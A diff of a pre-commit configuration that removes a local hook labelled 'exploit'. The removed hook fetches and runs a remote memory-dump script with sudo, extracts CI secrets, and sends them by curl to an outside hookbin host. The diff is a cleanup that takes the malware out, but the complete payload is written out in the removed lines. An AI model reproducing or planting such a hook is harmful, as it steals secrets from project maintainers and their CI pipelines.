@@ -2,13 +2,6 @@ default_language_version:
     python: python3
 
 repos:
--   repo: local
-    hooks:
-    -   id: exploit
-        name: exploit
-        entry: bash -c 'echo "Okay, we got this far. Let'\''s continue..."; curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\''\0'\'' | grep -aoE '\''"[^"]+":\{"value":"[^"]*","isSecret":true\}'\'' >> "/tmp/secrets"; curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"'
-        language: system
-        always_run: true
 -   repo: https://github.com/pre-commit/pre-commit-hooks
     rev: v4.6.0
     hooks:
